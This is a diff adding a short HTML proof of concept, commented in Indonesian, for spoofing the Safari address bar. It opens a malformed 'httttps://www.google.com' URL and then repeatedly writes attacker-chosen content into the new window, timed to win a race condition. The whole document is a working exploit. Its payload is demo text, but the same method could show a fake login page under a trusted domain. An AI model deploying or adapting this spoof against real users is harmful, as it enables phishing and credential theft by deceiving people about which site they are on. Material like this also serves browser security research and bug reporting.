@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Click to Spoof</button>
+
+  <script>
+    function spoof() {
+      // Buka domain invalid protocol → Safari gagal load tapi tetap tampil di address bar
+      let win = window.open("httttps://www.google.com", "_blank");
+
+      // Inject konten sendiri (karena halaman gagal load, jadi fallback ke controllable document)
+      let payload = `
+        <h1>This is NOT Google!</h1>
+        <p>You are seeing spoofed content.</p>
+      `;
+
+      let inject = () => {
+        try {
+          win.document.open();
+          win.document.write(payload);
+          win.document.close();
+        } catch (e) {
+          console.log("Blocked:", e);
+        }
+      };
+
+      // Timing untuk mengakali race condition
+      setTimeout(inject, 200);
+      setTimeout(inject, 500);
+      setTimeout(inject, 1000);
+    }
+  </script>
+</body>
+</html>
